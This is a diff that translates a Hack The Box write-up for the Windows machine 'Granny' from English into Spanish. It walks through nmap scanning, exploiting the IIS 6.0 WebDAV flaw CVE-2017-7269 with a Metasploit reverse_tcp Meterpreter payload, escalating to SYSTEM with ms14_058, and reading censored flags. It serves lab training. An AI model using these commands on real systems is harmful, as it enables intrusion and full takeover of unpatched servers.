@@ -1,36 +1,36 @@
 # Granny - Hack The Box | Write Up
 
-**Difficulty:** Easy | **OS:** Windows | **Author:** Ph4n3s
+**Dificultad:** Easy | **OS:** Windows | **Autor:** Ph4n3s
 
 ---
 
-## 1. Enumeration
+## 1. Enumeración
 
-First I check that the machine is up:
+Primero compruebo que la máquina está activa:
 
 ```bash
 ping -c 5 10.129.XX.XX
 ```
 
-I continue with a full port scan:
+Continúo con un escaneo de todos los puertos:
 
 ```bash
 nmap -p- --open -T4 --min-rate 5000 10.129.XX.XX -oN ~/HTB_machines/Granny/ports
 ```
 
-**Open ports:**
+**Puertos abiertos:**
 
 ```
 80/tcp open  http
 ```
 
-Only one port is open. I run recon scripts against it:
+Solo hay un puerto abierto. Lanzo scripts de reconocimiento sobre él:
 
 ```bash
 nmap -p 80 -sVC -T4 --min-rate 5000 10.129.XX.XX -oN ~/HTB_machines/Granny/targeted
 ```
 
-**Relevant result:**
+**Resultado relevante:**
 
 ```
 80/tcp open  http    Microsoft IIS httpd 6.0
@@ -43,13 +43,13 @@ nmap -p 80 -sVC -T4 --min-rate 5000 10.129.XX.XX -oN ~/HTB_machines/Granny/targe
 |_http-server-header: Microsoft-IIS/6.0
 ```
 
-**IIS 6.0 with WebDAV enabled.** This version of IIS ships with Windows Server 2003 and has a known buffer overflow vulnerability in the WebDAV module, specifically in the `ScStoragePathFromUrl` function (**CVE-2017-7269**). The number of available HTTP methods such as `PUT`, `MOVE` or `DELETE` also widens the attack surface.
+**IIS 6.0 con WebDAV habilitado.** Esta versión de IIS es de Windows Server 2003 y tiene una vulnerabilidad conocida de Buffer Overflow en el módulo WebDAV, específicamente en la función `ScStoragePathFromUrl` (**CVE-2017-7269**). La cantidad de métodos HTTP disponibles como `PUT`, `MOVE` o `DELETE` también amplía la superficie de ataque.
 
 ---
 
-## 2. Exploitation
+## 2. Explotación
 
-I open **msfconsole** and search for the matching module:
+Abro **msfconsole** y busco el módulo correspondiente:
 
 ```bash
 msfconsole
@@ -57,7 +57,7 @@ search iis_webdav
 use exploit/windows/iis/iis_webdav_scstoragepathfromurl
 ```
 
-I configure the exploit:
+Configuro el exploit:
 
 ```bash
 set RHOSTS 10.129.XX.XX
@@ -66,28 +66,28 @@ set payload windows/meterpreter/reverse_tcp
 run
 ```
 
-I get a Meterpreter session as `NT AUTHORITY\NETWORK SERVICE`.
+Obtengo una sesión Meterpreter como `NT AUTHORITY\NETWORK SERVICE`.
 
 ---
 
-## 3. Privilege escalation
+## 3. Escalada de Privilegios
 
-The `NETWORK SERVICE` user has very limited privileges and cannot access the flags directly. I need to migrate to a more stable process and escalate to SYSTEM.
+El usuario `NETWORK SERVICE` tiene privilegios muy limitados y no puede acceder a las flags directamente. Necesito migrar a un proceso más estable y escalar a SYSTEM.
 
-**I list the processes and migrate to a stable one:**
+**Listo los procesos y migro a uno estable:**
 
 ```bash
 meterpreter > ps
 meterpreter > migrate <PID>
 ```
 
-**I look for local escalation vectors:**
+**Busco vectores de escalada locales:**
 
 ```bash
 meterpreter > run post/multi/recon/local_exploit_suggester
 ```
 
-The module identifies several viable exploits. I use **ms14_058**:
+El módulo identifica varios exploits viables. Uso **ms14_058**:
 
 ```bash
 meterpreter > background
@@ -97,21 +97,21 @@ set LHOST tun0
 run
 ```
 
-I get a new Meterpreter session as `NT AUTHORITY\SYSTEM`.
+Obtengo una nueva sesión Meterpreter como `NT AUTHORITY\SYSTEM`.
 
 ---
 
-## 4. Post-Exploitation / Flags
+## 4. Post-Explotación / Flags
 
-From Meterpreter I open a Windows shell:
+Desde Meterpreter abro una shell de Windows:
 
 ```bash
 meterpreter > shell
 ```
 
-> On Windows Server 2003 the path is `Documents and Settings`, not `Users`.
+> En Windows Server 2003 el path es `Documents and Settings`, no `Users`.
 
-**User flag (Lakis):**
+**Flag de usuario (Lakis):**
 
 ```cmd
 cd C:\Documents and Settings\Lakis\Desktop
@@ -122,7 +122,7 @@ type user.txt
 700c5**************************
 ```
 
-**Administrator flag:**
+**Flag de administrador:**
 
 ```cmd
 cd C:\Documents and Settings\Administrator\Desktop
@@ -135,16 +135,16 @@ aa4bf**************************
 
 ---
 
-## Conclusion
+## Conclusión
 
-Granny is a machine very similar to Grandpa but with one key difference: here you do not get SYSTEM directly, there is a privilege escalation from `NETWORK SERVICE` that adds an extra step. The entry vector is **CVE-2017-7269**, the same buffer overflow in IIS 6.0 WebDAV that affects unpatched Windows Server 2003.
+Granny es una máquina muy similar a Grandpa pero con una diferencia clave: aquí no se obtiene SYSTEM directamente, hay una escalada de privilegios desde `NETWORK SERVICE` que añade un paso extra. El vector de entrada es **CVE-2017-7269**, el mismo Buffer Overflow en WebDAV de IIS 6.0 que afecta a Windows Server 2003 sin parchear.
 
-**Lessons:**
-- IIS 6.0 with WebDAV exposed on an unpatched server = critical vulnerability
-- `NETWORK SERVICE` is not `SYSTEM` — always verify the context of the initial session
-- `local_exploit_suggester` is essential for escalating privileges on old Windows machines
-- Systems that are not updated remain vulnerable to exploits more than a decade old
+**Lecciones:**
+- IIS 6.0 con WebDAV expuesto en un servidor sin parchear = vulnerabilidad crítica
+- `NETWORK SERVICE` no es `SYSTEM` — siempre verificar el contexto de la sesión inicial
+- `local_exploit_suggester` es imprescindible para escalar privilegios en máquinas Windows antiguas
+- Los sistemas sin actualizar siguen siendo vulnerables a exploits de hace más de una década
 
 ---
 
-> ⚠️ *This write up is for educational purposes. The flags are censored.*
+> ⚠️ *Este write up es con fines educativos. Las flags están censuradas.*
